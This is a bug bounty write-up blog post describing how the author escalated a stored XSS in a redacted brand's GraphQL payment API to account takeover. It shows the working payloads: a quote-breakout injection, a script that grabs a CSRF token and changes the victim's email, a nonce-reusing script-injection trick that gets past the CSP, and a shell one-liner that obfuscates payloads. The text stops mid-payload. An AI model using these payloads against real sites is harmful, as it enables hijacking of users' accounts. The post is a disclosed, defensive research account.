<!doctype html><html lang=en data-figures=true class=page><head><title>Bug Writeup: Stored XSS to Account Takeover (ATO) via GraphQL API | A developer's notes in the world of security research and bug bounty, by pmnh</title>
<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><meta http-equiv=X-UA-Compatible content="IE=edge"><script async src="https://www.googletagmanager.com/gtag/js?id=G-0MD8T00339"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-0MD8T00339")</script><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta name=description content="Writeup of a bug involving stored XSS via GraphQL and extensive payload development"><meta name=twitter:card content="summary"><meta name=twitter:creator content="@pmnh_"><meta name=twitter:title content="Bug Writeup: Stored XSS to Account Takeover (ATO) via GraphQL API"><meta property="og:url" content="https://www.pmnh.site/post/witeup_lhe_graphql_stored_xss/"><meta property="og:title" content="Bug Writeup: Stored XSS to Account Takeover (ATO) via GraphQL API"><meta property="og:description" content="Writeup of a bug involving stored XSS via GraphQL and extensive payload development"><meta property="og:image" content="https://www.pmnh.site/images/thumbnail.png"><link rel=apple-touch-icon sizes=180x180 href=https://www.pmnh.site/icons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://www.pmnh.site/icons/favicon-32x32.png><link rel=manifest href=https://www.pmnh.site/icons/site.webmanifest><link rel=canonical href=https://www.pmnh.site/post/witeup_lhe_graphql_stored_xss/><link rel=preload href=https://www.pmnh.site/css/styles.4cb8cd8d62d0b6b135b7536b82a60cf8cb07e6d7f2192edaedf13771b0c84657769257e422b9a739e51a2d10b4eef8ce3e81fb68b026459f8b1dde2b03422a78.css integrity="sha512-TLjNjWLQtrE1t1NrgqYM+MsH5tfyGS7a7fE3cbDIRld2klfkIrmnOeUaLRC07vjOPoH7aLAmRZ+LHd4rA0IqeA==" as=style crossorigin=anonymous><link rel=preload href=https://www.pmnh.site/en/js/bundle.19668860ea177cfe8cad686c7464b57e39acde1a4c33f6a1a8c57f7ab127ac39e8330b38e7184422cf0e9351ef3efaf75d122eca818d38a929941b8a5c04b09e.js as=script integrity="sha512-GWaIYOoXfP6MrWhsdGS1fjms3hpMM/ahqMV/erEnrDnoMws45xhEIs8Ok1HvPvr3XRIuyoGNOKkplBuKXASwng==" crossorigin=anonymous><link rel=stylesheet type=text/css href=https://www.pmnh.site/css/styles.4cb8cd8d62d0b6b135b7536b82a60cf8cb07e6d7f2192edaedf13771b0c84657769257e422b9a739e51a2d10b4eef8ce3e81fb68b026459f8b1dde2b03422a78.css integrity="sha512-TLjNjWLQtrE1t1NrgqYM+MsH5tfyGS7a7fE3cbDIRld2klfkIrmnOeUaLRC07vjOPoH7aLAmRZ+LHd4rA0IqeA==" crossorigin=anonymous></head><body data-code=10 data-lines=false id=documentTop><header class=nav_header><nav class=nav><a href=https://www.pmnh.site/ class="nav_brand nav_item" title="A developer's notes in the world of security research and bug bounty, by pmnh">A developer's notes in the world of security research and bug bounty, by pmnh<div class=nav_close><div><svg class="icon"><title>open-menu</title><use xlink:href="#open-menu"/></svg><svg class="icon"><title>closeme</title><use xlink:href="#closeme"/></svg></div></div></a><div class='nav_body nav_body_left'><div class=nav_parent><a href=https://www.pmnh.site/ class=nav_item title=Home>Home</a></div><div class=nav_parent><a href=https://www.pmnh.site/about/ class=nav_item title=About>About</a></div><div class=follow><a href=https://github.com/h1pmnh><svg class="icon"><title>github</title><use xlink:href="#github"/></svg>
</a><a href=https://twitter.com/pmnh_><svg class="icon"><title>twitter</title><use xlink:href="#twitter"/></svg>
</a><a href=https://www.pmnh.site/index.xml><svg class="icon"><title>rss</title><use xlink:href="#rss"/></svg></a><div class=color_mode><input type=checkbox class=color_choice id=mode></div></div></div></nav></header><main><div class="grid-inverse wrap content"><article class=post_content><h1 class=post_title>Bug Writeup: Stored XSS to Account Takeover (ATO) via GraphQL API</h1><div class=post_meta><span><svg class="icon"><title>calendar</title><use xlink:href="#calendar"/></svg>
</span><span class=post_date>Jun 29, 2023</span>
<span class=post_time>· 16 min read</span><span>&nbsp;· <a href=https://www.pmnh.site/tags/writeup title=writeup class="post_tag button button_translucent">writeup
</a><a href=https://www.pmnh.site/tags/xss title=xss class="post_tag button button_translucent">xss
</a><a href=https://www.pmnh.site/tags/graphql title=graphql class="post_tag button button_translucent">graphql
</a><a href=https://www.pmnh.site/tags/hackerone title=hackerone class="post_tag button button_translucent">hackerone
</a></span><span class=page_only>&nbsp;·<div class=post_share>Share on:
<a href="https://twitter.com/intent/tweet?text=Bug%20Writeup%3a%20Stored%20XSS%20to%20Account%20Takeover%20%28ATO%29%20via%20GraphQL%20API&url=https%3a%2f%2fwww.pmnh.site%2fpost%2fwiteup_lhe_graphql_stored_xss%2f&tw_p=tweetbutton" class=twitter title="Share on Twitter" target=_blank rel=nofollow><svg class="icon"><title>twitter</title><use xlink:href="#twitter"/></svg>
</a><a href="https://www.facebook.com/sharer.php?u=https%3a%2f%2fwww.pmnh.site%2fpost%2fwiteup_lhe_graphql_stored_xss%2f&t=Bug%20Writeup%3a%20Stored%20XSS%20to%20Account%20Takeover%20%28ATO%29%20via%20GraphQL%20API" class=facebook title="Share on Facebook" target=_blank rel=nofollow><svg class="icon"><title>facebook</title><use xlink:href="#facebook"/></svg>
</a><a href=#linkedinshare id=linkedinshare class=linkedin title="Share on LinkedIn" rel=nofollow><svg class="icon"><title>linkedin</title><use xlink:href="#linkedin"/></svg>
</a><a href=https://www.pmnh.site/post/witeup_lhe_graphql_stored_xss/ title="Copy Link" class="link link_yank"><svg class="icon"><title>copy</title><use xlink:href="#copy"/></svg></a></div></span></div><div class=post_toc><h2>Overview</h2><nav id=TableOfContents><ul><li><a href=#stored-xss-to-account-takeover-ato-via-graphql-api>Stored XSS to Account Takeover (ATO) via GraphQL API</a></li><li><a href=#the-setup>The Setup</a></li><li><a href=#the-payload>The Payload</a></li><li><a href=#attempt-1-javascript-url>Attempt 1: <code>javascript://</code> url</a><ul><li><a href=#side-note-several-false-starts-here>Side Note: Several false starts here</a></li></ul></li><li><a href=#attempt-2-trailing-payload>Attempt 2: Trailing payload</a></li><li><a href=#submission>Submission</a></li><li><a href=#challenge-accepted>Challenge Accepted!</a></li><li><a href=#next-step-building-the-ato-payload>Next Step: Building the ATO payload</a></li><li><a href=#attempt-3-rejection>Attempt 3: Rejection</a></li><li><a href=#attempt-4-async>Attempt 4: Async</a></li><li><a href=#attempt-5-one-more-thing>Attempt 5: One more thing...</a></li><li><a href=#attempt-6-a-different-approach>Attempt 6: A different approach</a></li><li><a href=#attempt-7-special-character-avoidance>Attempt 7: Special Character avoidance</a></li><li><a href=#final-step-that-pesky-redirect>Final Step: That pesky redirect</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div><div class=post_body><h2 id=stored-xss-to-account-takeover-ato-via-graphql-api>Stored XSS to Account Takeover (ATO) via GraphQL API</h2><p>Late last year on HackerOne during an LHE (this is only important later due to an extreme time crunch), I found an extremely challenging vulnerability on a major brand's web site involving several layers of exploitation ultimately resulting in a stored XSS payload that was able to take over a victim's account simply by visiting a specific, innocuous page on the brand's main website (<code>www.redacted.com</code>). The scope of this vulnerability was entirely within the brand's public program.</p><p>This vulnerability paid out as a high (CVSS 8.7) and I thought the process of discovering and then exploiting it would be interesting to describe. One thing that I will not shy away from here is that I was stuck - completely stuck - several times during the course of exploiting this vulnerability. I almost gave up and thought it was impossible, particularly because I have a very bad track record for exploiting tough XSS and especially dealing with weird encoding solutions.</p><p>However, I thought it could also be inspiring and maybe someone reading this will reconsider a bug they thought that they took to the limit - and push through to a higher impact outcome!</p><h2 id=the-setup>The Setup</h2><p>The initial vulnerability that I found had to do with this brand's payment processing API - this is an API that is used by customers (merchants) to process credit cards and financial transactions in various countries. This brand is multi-national, so they deal with many different types of transactions in many different countries - including some that I, based in the US, had never heard of and had to research as part of my recon.</p><p>One type of transaction that this payment processor supported was an offline payment flow to handle geographies where credit cards are uncommon and cash transactions are more prevalent. In these locations, the payment processor allows a customer to make an e-commerce purchase and acquire a unique code (like a QR code) which they can bring into a store and pay cash for the transaction. Once the store confirms the transaction, the e-commerce merchant is paid for the goods and the customer will receive them.</p><p>Thus, the flow of the transaction goes something like this:</p><ul><li>e-commerce merchant initiates an offline payment flow when the customer places their order</li><li>e-commerce merchant gives the customer a unique in-store code which can be used for payment</li><li>(offline) customer brings the code to a store in the payment network and pays in cash</li><li>e-commerce merchant is notified that the payment occurred</li><li>e-commerce merchant sends the customer a unique URL which they can visit to confirm their purchase</li></ul><p>Note that the "unique URL" in the final step is supplied by the merchant when the transaction is set up (you can think of this as the "confirmation URL" in a traditional online credit card-based workflow).</p><h2 id=the-payload>The Payload</h2><p>In this case our attacker is a merchant (or a user of that merchant) with the ability to create these offline transactions. The merchant will submit a confirmation URL containing an XSS payload. This payload, once persisted, is visible under a page on the brand's main website (<code>www.redacted.com</code>).</p><p>Our merchant submits the request via a GraphQL API on a different domain <code>payments.redactedtwo.com</code> which has a payload as follows (apologies for so much redaction):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=ln>1</span><span class=cl><span class=nf>POST</span> <span class=nn>/graphql</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=ln>2</span><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>payments.redactedtwo.com</span>
</span></span><span class=line><span class=ln>3</span><span class=cl><span class=err>...</span>
</span></span><span class=line><span class=ln>4</span><span class=cl><span class=g>
</span></span></span><span class=line><span class=ln>5</span><span class=cl><span class=g>{&#34;query&#34;:&#34;mutation {\n  ...redacted...(input:{ ...redacted... \n
</span></span></span><span class=line><span class=ln>6</span><span class=cl><span class=g>      returnUrl: \&#34;&lt;payload here&gt;\&#34; ... }) ...
</span></span></span></code></pre></div><p>We can see this GraphQL API accepts a <code>returnUrl</code> parameter that will be our payload source. Note that the GraphQL call is an API on a completely separate top-level domain. This was interesting because it allowed a stored payload in one of the brand's domains to be rendered in another, arguably more critical, domain. Once submitted, we can visit a unique, static URL on the <code>www.redacted.com</code> site containing our payload in the <code>returnUrl</code> parameter.</p><p>Let's see how the payload appears on the sink at <code>www.redacted.com</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=ln>1</span><span class=cl><span class=p>&lt;</span><span class=nt>script</span> <span class=na>nonce</span><span class=o>=</span><span class=s>&#34;G4bzKjjcoKYHhRqFR4jI3hADUnme1CL14sqI8gUqRhcRi+DE&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=ln>2</span><span class=cl><span class=nb>window</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>href</span> <span class=o>=</span> <span class=s1>&#39;&lt;payload&gt;?..dynamic url parameters...&#39;</span>
</span></span><span class=line><span class=ln>3</span><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>We see this script has a nonce, and our injection point <code>&lt;payload></code> is within the script - seems like a very easy stored XSS, right?</p><p>The presence of the nonce will become important later, let's look at the <code>Content-Security-Policy</code> header to see what restrictions that are in place (note: I didn't look at CSP until I was well into payload development - big mistake that caused me to backtrack at least 2 hours for reasons I will describe later). I'll break it into lines for easier reading:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln> 1</span><span class=cl>Content-Security-Policy:
</span></span><span class=line><span class=ln> 2</span><span class=cl>default-src &#39;self&#39; &#39;unsafe-inline&#39; https://*.redacted.com https://*.redactedtwo.com;
</span></span><span class=line><span class=ln> 3</span><span class=cl>script-src &#39;nonce-G4bzKjjcoKYHhRqFR4jI3hADUnme1CL14sqI8gUqRhcRi+DE&#39; &#39;self&#39; &#39;unsafe-inline&#39; https://*.redacted.com https://*.redactedtwo.com;
</span></span><span class=line><span class=ln> 4</span><span class=cl>img-src &#39;self&#39; https:;
</span></span><span class=line><span class=ln> 5</span><span class=cl>frame-src &#39;self&#39; https://*.redacted.com https://*.redactedtwo.com https://*.qualtrics.com;
</span></span><span class=line><span class=ln> 6</span><span class=cl>child-src &#39;self&#39; https://*.redacted.com https://*.redactedtwo.com;
</span></span><span class=line><span class=ln> 7</span><span class=cl>object-src &#39;none&#39;;
</span></span><span class=line><span class=ln> 8</span><span class=cl>font-src &#39;self&#39; https://*.redacted.com https://*.redactedtwo.com;
</span></span><span class=line><span class=ln> 9</span><span class=cl>base-uri &#39;self&#39; https://*.redacted.com;
</span></span><span class=line><span class=ln>10</span><span class=cl>form-action &#39;self&#39; https://*.redacted.com;
</span></span><span class=line><span class=ln>11</span><span class=cl>upgrade-insecure-requests;
</span></span><span class=line><span class=ln>12</span><span class=cl>connect-src &#39;self&#39; &#39;unsafe-inline&#39; https://*.redacted.com https://*.redactedtwo.com https://*.qualtrics.com;
</span></span></code></pre></div><p>We can see that this CSP is quite restrictive - we can only source information from the (hardened) brand site itself, and the nonce is required for any script tags on the page.</p><h2 id=attempt-1-javascript-url>Attempt 1: <code>javascript://</code> url</h2><p>The obvious first attempt with an injection point at the <code>location.href=</code> is to simply put a Javascript scheme with a payload, e.g. <code>javascript://alert(1)</code>. I was lucky because here there was no obvious WAF blocking simple payloads like this. So I tried this and...</p><p>... it failed. The GraphQL API rejected the URL with a <code>400</code> error. I tried many other attempts, encoding, base, whitespace, etc. - no luck. The API was validating that the URL provided started with <code>https://</code> and contained a full hostname followed by a trailing <code>/</code>. So clearly we have an open redirect but I knew this could be exploited for a stored XSS.</p><p>For example <code>https://hackerone.com/</code> would result in the following stored payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=ln>1</span><span class=cl><span class=p>&lt;</span><span class=nt>script</span> <span class=na>nonce</span><span class=o>=</span><span class=s>&#34;G4bzKjjcoKYHhRqFR4jI3hADUnme1CL14sqI8gUqRhcRi+DE&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=ln>2</span><span class=cl><span class=nb>window</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>href</span> <span class=o>=</span> <span class=s1>&#39;https://hackerone.com/?...dynamic URL parameters...&#39;</span>
</span></span><span class=line><span class=ln>3</span><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>A quick note on the <code>...dynamic URL parameters...</code> - these are parameters which are appended to the URL provided in the GraphQL API representing the unique transaction ID, information about the customer, etc. - this always is appended with a leading <code>?</code> within the single quotes.</p><h3 id=side-note-several-false-starts-here>Side Note: Several false starts here</h3><p>Later on in this story, for reasons which will become obvious, I tried submitting various forms of <code>https://</code> urls without the trailing slash - this would lead to everything after the hostname being URL encoded and generally being useless for XSS in a Javascript context. I should have tried this earlier on as it would have saved a ton of time later.</p><h2 id=attempt-2-trailing-payload>Attempt 2: Trailing payload</h2><p>We know at this point the payload has to start with a valid URL and hostname, so we start with <code>https://hackerone.com/</code> as the start of our payload.</p><p>Fortunately for us, the next most obvious payload I could think of worked. Single quote characters were not blocked or encoded in any way, so the following payload actually generated a stored alert:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>https://hackerone.com/&#39;;alert(document.domain);//
</span></span></code></pre></div><p>This generated an alert (great) but when closed the user was immediately redirected to the URL provided. Excellent! Stored XSS payload with DOM access!</p><h2 id=submission>Submission</h2><p>At this point I thought I was good and submitted the bug in the LHE prior to the on-site portion of the event. After it was triaged at a Medium impact, I sent a note to the triage / customer team asking what was required to prove higher impact.</p><blockquote><p>As an aside, for those who don't know how HackerOne LHEs are structured, there is a portion (5.5 days) during which the LHE participants are informed on the scope and can submit bugs. These bugs are triaged but not finalized / paid until the live portion of the event. The live portion comprises a single day (actually ~10 hours) where participants can submit additional bugs or escalated previously submitted bugs.</p></blockquote><p>The customer (via the triage team) responded that they felt with the CSP and cookie settings in place on the main site, it was not possible to escalate the stored XSS to any higher severity.</p><h2 id=challenge-accepted>Challenge Accepted!</h2><p>Of course I considered this a challenge because I knew with the payload sitting in a <code>&lt;script nonce></code> context I should be able to craft any payload I want, exploiting this will be easy!</p><h2 id=next-step-building-the-ato-payload>Next Step: Building the ATO payload</h2><p>I began to craft the best stored XSS ATO payload I could imagine. The payload performed the following tasks, which I tested in the dev console (F12) of a window I had open on the main site:</p><ul><li>Grab the CSRF token for the user by making a <code>XMLHttpRequest</code> to the site's main page</li><li>Extract the CSRF token by parsing the HTML returned from the <code>fetch</code> call</li><li>Make an API call to change the email address on the account using <code>XMLHttpRequest</code></li></ul><p>Note that the <a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src><code>connect-src</code></a> in the CSP made it impossible to try to exfiltrate information from the page to an attacker domain using Javascript, therefore ATO (or similar behavior of CSRF was my option for an impactful payload here).</p><p>At this point the account can be taken by the attacker as they control the email address and can use the "forgot password" functionality to complete the takeover. The cookies (even <code>HttpOnly</code>) will be sent on the last request becasse the same-origin policy will allow them to be included (the XHR is originating from the correct domain, <code>www.redacted.com</code>).</p><p>As I imagine most of you are familiar with writing a payload of this type I won't get into details here, as it was pretty simple:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=ln> 1</span><span class=cl><span class=kd>function</span> <span class=nx>decodeHtml</span><span class=p>(</span><span class=nx>html</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 2</span><span class=cl>    <span class=kd>var</span> <span class=nx>txt</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;textarea&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 3</span><span class=cl>    <span class=nx>txt</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=nx>html</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 4</span><span class=cl>    <span class=k>return</span> <span class=nx>txt</span><span class=p>.</span><span class=nx>value</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 5</span><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=ln> 6</span><span class=cl><span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;https://www.redacted.com/url/to/get/csrf/&#34;</span><span class=p>).</span><span class=nx>then</span><span class=p>(</span><span class=nx>r</span> <span class=p>=&gt;</span> <span class=nx>r</span><span class=p>.</span><span class=nx>text</span><span class=p>()).</span><span class=nx>then</span><span class=p>(</span><span class=nx>r</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 7</span><span class=cl>  <span class=nx>csrf_token</span> <span class=o>=</span> <span class=sr>/data-token=&#34;([^&#34;]*)&#34;/</span><span class=p>.</span><span class=nx>exec</span><span class=p>(</span><span class=nx>r</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=ln> 8</span><span class=cl>  <span class=kd>var</span> <span class=nx>xhr</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>XMLHttpRequest</span><span class=p>();</span>
</span></span><span class=line><span class=ln> 9</span><span class=cl>  <span class=nx>xhr</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=s2>&#34;POST&#34;</span><span class=p>,</span> <span class=s2>&#34;https://www.redacted.com/api/to/change/email&#34;</span><span class=p>,</span> <span class=kc>true</span><span class=p>);</span>
</span></span><span class=line><span class=ln>10</span><span class=cl>  <span class=nx>xhr</span><span class=p>.</span><span class=nx>setRequestHeader</span><span class=p>(</span><span class=s2>&#34;X-Csrf-Token&#34;</span><span class=p>,</span> <span class=nx>decodeHtml</span><span class=p>(</span><span class=nx>csrf_token</span><span class=p>));</span>
</span></span><span class=line><span class=ln>11</span><span class=cl>  <span class=nx>xhr</span><span class=p>.</span><span class=nx>setRequestHeader</span><span class=p>(</span><span class=s2>&#34;Content-Type&#34;</span><span class=p>,</span> <span class=s2>&#34;application/json&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>12</span><span class=cl>  <span class=nx>xhr</span><span class=p>.</span><span class=nx>withCredentials</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=ln>13</span><span class=cl>  <span class=nx>o</span><span class=o>=</span><span class=k>new</span> <span class=nb>Object</span><span class=p>();</span> <span class=p>...</span> <span class=nx>other</span> <span class=nx>parameters</span> <span class=p>...</span>  <span class=nx>o</span><span class=p>.</span><span class=nx>email</span><span class=o>=</span><span class=s1>&#39;&lt;my_email_address&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=ln>14</span><span class=cl>  <span class=nx>xhr</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>(</span><span class=nx>o</span><span class=p>));</span>
</span></span><span class=line><span class=ln>15</span><span class=cl><span class=p>})</span>
</span></span></code></pre></div><p>I tested this in the Chrome dev console and confirmed it had the desired effect of ATO. Ready to go!</p><h2 id=attempt-3-rejection>Attempt 3: Rejection</h2><p>I submitted the payload to the GraphQL API and it was looking good! No errors initially, but then I hit the stored XSS page itself and saw...</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>HTTP/2 400 Bad Request
</span></span></code></pre></div><p>The stored payload did not render!</p><p>Went back to the original <code>alert(document.domain)</code> payload, and it worked. So, there must be something in my complete ATO payload that was causing the server not to render the XSS.</p><p>After <em>much</em> iteration with the working payload (unfortunately since source and sink were different transactions and required several in-between steps, I couldn't use any convenient automated tools), I discovered that <em>all</em> the following characters would lead to the <code>400</code> error:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>{}&lt;&gt;&#34;[]
</span></span></code></pre></div><p>Note all whitespace characters were also rejected. There may be other characters that I don't remember &#x1f601; but the following definitely were <em>not</em> blocked:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>()=.;/\
</span></span></code></pre></div><p>So, I had a limited Javascript vocabulary to deal with, no problem!</p><h2 id=attempt-4-async>Attempt 4: Async</h2><p>I ended up rewriting most of my payload to exclude the restricted characters. Note that I tried all types of encoding (URL, javascript, hex, octal, double-encoding, etc.) and none of these could be used to bypass the restrictions. I'll note this was extremely tedious because the error showed up at the sink, not the source, so each iteration wasted at least a minute or two.</p><p>I even got the initial <code>fetch</code> request to work with the restricted character set, with something like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>https://hackerone.com/&#39;;fetch(&#34;https://www.redacted.com/url/to/get/csrf/&#34;).then(console.log);//
</span></span></code></pre></div><p>I could see the <code>Response</code> object from the <code>fetch</code> call hit the console log - now we are getting somewhere!</p><p>Then I ran into <strong>the big problem</strong>.</p><p>Remember that my attack chain requires 3 steps:</p><ul><li>Make XHR call to get page with CSRF token on it</li><li>Extract CSRF token from the returned HTML</li><li>Make XHR call with CSRF token to ATO</li></ul><p>Because <code>fetch</code> (and <code>XMLHttpRequest</code>) are async APIs we need to fill in the <code>then</code> method argument with a <a href=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions>lambda function</a>, which will be asynchronously executed when the Promise resolves (more on this at <a href=https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Asynchronous/Promises>mdn</a>). Here's the problem, without the <code>{}></code> characters I do not believe there is a way to construct a lambda function in Javascript, either with brace syntax or arrow syntax (if someone smart reading this comes up with a suggestion, my DMs are open on Twitter and I'm very interested!).</p><p>I recognized this immediately as a huge roadblock. Even if I rewrite the rest of my payload to avoid all these other characters (which ended up being possible) the inability to define lambda functions to be called when the Promise resolved was a showstopper.</p><p>But wait! In the documentation of the <code>Function</code> object in the Javascript reference, there is a form <code>Function(var, body)</code> where <code>body</code> is a <em>string</em>! No braces or arrow syntax required!</p><h2 id=attempt-5-one-more-thing>Attempt 5: One more thing...</h2><p>I excitedly rewrote my payload to take advantage of this amazing syntax only to find something I missed in the CSP... <code>eval</code> is not allowed due to the CSP missing the <code>unsafe-eval</code> directive. That's right, this form of the <code>Function</code> constructor (not surprisingly) uses <code>eval</code> under the covers to convert that string to an actual Javascript function.</p><p>This was unfortunate because I wasted about 30 precious minutes figuring out how this syntax worked (the documentation is a bit vague on how variables are passed in and referenced).</p><p>I decided that this approach was simply impossible due to the specific characters that were being blocked. (Actually at this time I hadn't figured out that whitespace was also blocked for some reason, I will blame lack of sleep), which would have made writing a function difficult to impossible anyway.</p><h2 id=attempt-6-a-different-approach>Attempt 6: A different approach</h2><p>So at this point I got some food as I had been struggling for at least 3 hours without a break. As I wandered the hall I pondered. Clearly I could call Javascript methods because I had access to the <code>().;</code> characters. Surely I could come up with something!</p><p>(I'll add that I'm sure someone would have been more than happy to help me but as this was my first LHE I wanted to get a really impactful bug without assistance of any kind!)</p><p>I realized three things at this point:</p><ul><li>In order to successfully deliver my working payload I needed to work around the blocked special characters,</li><li>I had confirmed that I could execute arbitrary Javascript code provided I was careful about what characters I used,</li><li>I had access to the correct value of the nonce in the DOM on the <code>&lt;script></code> tag that was already there</li></ul><p>I decided that I'd try the following approach:</p><ul><li>Use very simple Javascript to create a new <code>&lt;script></code> DOM node</li><li>Set the nonce on that script node to match the nonce of the <code>&lt;script></code> node already on the page</li><li>Figure out a way to encode my payload so that I could set the <code>innerText</code> of the new <code>&lt;script></code> node to a value that did not have special characters</li><li>Insert my new <code>&lt;script></code> tag into the DOM and the payload will execute</li></ul><blockquote><p>As a fun bit of trivia, if you haven't already encountered this - if a <code>&lt;script></code> tag has already started executing (the one tag on the page), replacing the <code>innerText</code> will do nothing. Due to the CSP I didn't see any way other than a <code>&lt;script></code> tag with nonce to execute my payload (again, I'm interested in comments or suggestions if I did!).</p><p>However, if the page hasn't completed rendering and execution of inline script, you can insert a new <code>&lt;script></code> node after the inline script and it will execute (note this <em>only</em> works if the page hasn't loaded yet - if you try to insert a <code>&lt;script></code> DOM node after the <code>onload</code> event has fired, it's too late).</p></blockquote><p>Hope you are all still with me!</p><p>I decided to try this with a simple payload that looked something like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>https://hackerone.com/&#39;;s=document.createElement(&#39;script&#39;);s.nonce=document.getElementsByTagName(&#39;script&#39;).item(1).nonce;s.innerText=&#39;alert(document.domain);&#39;;document.head.appendChild(s);;//&#39;
</span></span></code></pre></div><p>I fired it and... it worked! The alert popped and the presence of the nonce on the new tag allowed my script to pass the CSP checks.</p><p>Super excited because it seemed like this strategy was going to work!</p><h2 id=attempt-7-special-character-avoidance>Attempt 7: Special Character avoidance</h2><p>I will say that I basically had the idea for the rest of the payload at this point, but I was under extreme time pressure to submit my escalation before the end of the LHE and ended up wasting some time with a couple stupid mistakes.</p><p>The first mistake was trying to just encode only those characters that were being blocked. This was hard to do manually and took a lot of time when I discovered I missed a character.</p><p>So I decided on the following approach:</p><ul><li>Create a file <code>redacted_payload.txt</code> with my Javascript payload</li><li>Run the following shell command to encode every character in the file into a series of calls to <code>String.fromCharCode</code></li></ul><p>The resulting shell command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=ln>1</span><span class=cl><span class=o>(</span><span class=k>for</span> i in <span class=sb>`</span>cat redacted_payload.txt <span class=p>|</span> xxd -ps -c <span class=m>0</span> <span class=p>|</span> sed -e <span class=s1>&#39;s/\(..\)/\1\n/g&#39;</span><span class=sb>`</span><span class=p>;</span> <span class=k>do</span> <span class=nb>echo</span> <span class=s2>&#34;String.fromCharCode(&#34;</span><span class=k>$((</span><span class=m>16#</span><span class=si>${</span><span class=nv>i</span><span class=si>}</span><span class=k>))</span><span class=s2>&#34;)+&#34;</span><span class=p>;</span> <span class=k>done</span><span class=o>)</span> <span class=p>|</span> tr -d <span class=s1>&#39;\n&#39;</span>
</span></span></code></pre></div><p>And the output:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>String.fromCharCode(123)+String.fromCharCode(32)+String.fromCharCode(102)+String.fromCharCode(117)+
</span></span><span class=line><span class=ln>2</span><span class=cl>... repeating for many characters ...
</span></span></code></pre></div><p>Again, when not under time pressure I'm sure I could some up with something more elegant here, but this worked and I ended up with a very large payload (fortunately there was no length limit on the URL that could be stored!).</p><p>I submitted the full payload which now looked like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=ln>1</span><span class=cl><span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>hackerone</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=s1>&#39;;s=document.createElement(&#39;</span><span class=n>script</span><span class=s1>&#39;);s.nonce=document.getElementsByTagName(&#39;</span><span class=n>script</span><span class=s1>&#39;).item(1).nonce;s.innerText=&lt;very_long_encoded_payload&gt;;document.head.appendChild(s);;//&#39;</span>
